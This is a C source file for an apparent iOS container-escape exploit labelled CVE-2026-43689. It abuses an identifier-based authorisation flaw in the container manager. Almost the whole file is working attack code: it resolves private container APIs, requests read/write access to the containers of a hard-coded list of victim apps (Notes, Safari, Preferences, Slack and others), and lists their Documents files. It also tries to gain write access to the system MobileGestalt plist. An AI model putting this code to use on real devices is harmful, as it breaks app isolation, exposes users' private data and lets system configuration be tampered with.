/* MobileHouseArrest container escape (CVE-2026-43689, CWE-862).
 *
 * The containermanagerd authorises the caller by the CodeDirectory
 * identifier, and the authorisation key is the string
 * "com.apple.mobile.MobileHouseArrest" - the entitlement name, not a
 * bundle id. With an ad-hoc signature the identifier is arbitrary, so an
 * app that signs itself with that identifier is treated as the house
 * arrest client and is allowed to vend ANY app container.
 *
 * The whole client lives in libsystem_containermanager.dylib, which is
 * inside the app sandbox - no kernel bug, no pointer, no leak:
 *
 *   query_set_class(q, 2)                     app-data container
 *   query_set_ids(q, "<victim bundle id>")    the victim
 *   query_set_flags(q, 0x900000000)           read+write
 *   query_set_part(q, 0)                      the part domain
 *   obj   = container_query_get_single_result(q)
 *   path  = container_object_get_path(obj)
 *   token = container_copy_sandbox_token(obj)
 *   container_object_sandbox_extension_activate(obj, false)  -> access
 *
 * The class-13 variant asks for the MobileGestalt system group
 * (flags 0x8100000000, part 3 = Library/Caches) - read/write of the live
 * MobileGestalt plist.
 */
#include "exploit.h"
#include "nk_trace.h"
#include <dlfcn.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <dirent.h>
#include <CoreFoundation/CoreFoundation.h>

/* xpc: the Theos SDK has no xpc/ headers, so the two calls we need are
 * declared by hand (libxpc is in libSystem). */
typedef struct xpc_object_s *xpc_object_t;
extern xpc_object_t xpc_string_create(const char *s);
extern void xpc_release(xpc_object_t o);

typedef void *container_query_t;
typedef void *container_object_t;

static const char *k_victims[] = {
    "com.dj.srk801",
    "com.apple.mobilenotes",
    "com.apple.mobilesafari",
    "com.apple.Preferences",
    "com.apple.mobileslack",
    NULL
};

static int can_open(const char *path, int flags)
{
    int fd = open(path, flags | O_CLOEXEC);
    if (fd < 0) return 0;
    close(fd);
    return 1;
}

void nk_mha_attack(void)
{
    nk_doc_log_open("mha.log");
    nk_log("[MHA] === MobileHouseArrest container escape ===");
    /* the identifier IS the authorisation key - it must be
     * "com.apple.mobile.MobileHouseArrest" for MCM to vend anything */
    {
        const char *me = getenv("MHA_IDENT");
        extern char **environ;
        (void)me; (void)environ;
    }
    {
        /* NSBundle's identifier, read via the CFBundle API */
        CFBundleRef b = CFBundleGetMainBundle();
        if (b) {
            CFStringRef id = CFBundleGetIdentifier(b);
            if (id) {
                char buf[256] = {0};
                if (CFStringGetCString(id, buf, sizeof(buf), kCFStringEncodingUTF8)) {
                    nk_log("[MHA] our bundle identifier = %s", buf);
                    nk_doc_log("mha.log", "[MHA] our bundle identifier = %s", buf);
                }
                CFRelease(id);
            }
        }
    }

    void *lib = dlopen("/usr/lib/system/libsystem_containermanager.dylib",
                       RTLD_NOW | RTLD_LOCAL);
    if (!lib) { nk_log("[MHA] dlopen failed: %s", dlerror()); return; }

    container_query_t (*q_create)(void) = dlsym(lib, "container_query_create");
    void (*q_class)(container_query_t, uint64_t) = dlsym(lib, "container_query_set_class");
    void (*q_ids)(container_query_t, xpc_object_t) = dlsym(lib, "container_query_set_identifiers");
    void (*q_gids)(container_query_t, xpc_object_t) = dlsym(lib, "container_query_set_group_identifiers");
    void (*q_flags)(container_query_t, uint64_t) = dlsym(lib, "container_query_operation_set_flags");
    void (*q_part)(container_query_t, uint64_t) = dlsym(lib, "container_query_operation_set_part");
    container_object_t (*q_result)(container_query_t) = dlsym(lib, "container_query_get_single_result");
    void (*q_free)(container_query_t) = dlsym(lib, "container_query_free");
    container_object_t (*o_copy)(container_object_t) = dlsym(lib, "container_object_copy");
    void (*o_free)(container_object_t) = dlsym(lib, "container_object_free");
    const char *(*o_path)(container_object_t) = dlsym(lib, "container_object_get_path");
    char *(*o_token)(container_object_t) = dlsym(lib, "container_copy_sandbox_token");
    int (*o_activate)(container_object_t, int) = dlsym(lib, "container_object_sandbox_extension_activate");

    if (!q_create || !q_class || !q_ids || !q_flags || !q_result || !q_free ||
        !o_copy || !o_free || !o_path || !o_token || !o_activate) {
        nk_log("[MHA] dlsym failed (missing symbols)");
        for (const char *n = "container_query_create\0container_query_set_class\0container_query_set_identifiers\0container_query_operation_set_flags\0container_query_get_single_result\0container_object_get_path\0container_copy_sandbox_token\0container_object_sandbox_extension_activate\0"; *n; n += strlen(n) + 1)
            if (!dlsym(lib, n)) nk_log("[MHA]   MISSING: %s", n);
        dlclose(lib);
        return;
    }
    nk_log("[MHA] all symbols resolved");

    /* --- class 2: the container of another app ------------------------- */
    for (uint32_t v = 0; k_victims[v]; v++) {
        container_query_t q = q_create();
        if (!q) { nk_log("[MHA] query_create failed"); break; }
        q_class(q, 2);
        xpc_object_t id = xpc_string_create(k_victims[v]);
        q_ids(q, id);
        xpc_release(id);
        q_flags(q, 0x900000000ULL);
        if (q_part) q_part(q, 0);
        container_object_t borrowed = q_result(q);
        container_object_t obj = borrowed ? o_copy(borrowed) : NULL;
        if (!obj) {
            nk_log("[MHA] victim=%s -> NO RESULT (denied or not installed)", k_victims[v]);
            q_free(q);
            continue;
        }
        const char *p = o_path(obj);
        nk_log("[MHA] victim=%s -> path=%s", k_victims[v], p ? p : "(null)");
        char probe[512];
        if (p) {
            snprintf(probe, sizeof(probe), "%s/Documents", p);
            int before = can_open(probe, O_RDONLY);
            char *tok = o_token(obj);
            nk_log("[MHA]   token=%s", (tok && tok[0]) ? "present" : "none");
            free(tok);
            int act = o_activate(obj, 0);
            nk_log("[MHA]   activated=%d", act);
            int after = can_open(probe, O_RDONLY);
            nk_log("[MHA]   Documents readable before=%d after=%d", before, after);
            if (after && !before) {
                nk_log("[MHA] *** CONTAINER ESCAPE: %s is readable", probe);
                nk_doc_log("mha.log", "[MHA] *** CONTAINER ESCAPE: %s", probe);
                /* list the victim's Documents */
                {
                    DIR *dp = opendir(probe);
                    if (dp) {
                        struct dirent *de;
                        while ((de = readdir(dp)) != NULL) {
                            if (de->d_name[0] == '.') continue;
                            nk_log("[MHA]     victim file: %s", de->d_name);
                        }
                        closedir(dp);
                    }
                }
            }
        }
        o_free(obj);
        q_free(q);
    }

    /* --- class 13: the MobileGestalt system group ---------------------- */
    if (q_gids) {
        container_query_t q = q_create();
        q_class(q, 13);
        xpc_object_t g = xpc_string_create("systemgroup.com.apple.mobilegestaltcache");
        q_gids(q, g);
        xpc_release(g);
        q_flags(q, 0x8100000000ULL);
        if (q_part) q_part(q, 3);
        container_object_t borrowed = q_result(q);
        container_object_t obj = borrowed ? o_copy(borrowed) : NULL;
        if (!obj) {
            nk_log("[MHA] class13 -> NO RESULT");
        } else {
            const char *p = o_path(obj);
            nk_log("[MHA] class13 -> path=%s", p ? p : "(null)");
            if (p) {
                char pl[512];
                snprintf(pl, sizeof(pl), "%s/Library/Caches/com.apple.MobileGestalt.plist", p);
                int before = can_open(pl, O_RDWR);
                char *tok = o_token(obj);
                nk_log("[MHA]   token=%s", (tok && tok[0]) ? "present" : "none");
                free(tok);
                int act = o_activate(obj, 0);
                int after = can_open(pl, O_RDWR);
                nk_log("[MHA]   MG plist writable before=%d after=%d activated=%d", before, after, act);
                if (after && !before)
                    nk_log("[MHA] *** MOBILEGESTALT IS WRITABLE: %s", pl);
            }
            o_free(obj);
        }
        q_free(q);
    }

    dlclose(lib);
    nk_log("[MHA] done");
}

/* Swift cannot call variadic C functions, so the identifier goes through a
 * plain wrapper. */
void nk_mha_log_ident(const char *ident)
{
    nk_doc_log_open("mha.log");
    nk_log("[MHA] IDENT = %s", ident ? ident : "?");
    nk_doc_log("mha.log", "[MHA] IDENT = %s", ident ? ident : "?");
}
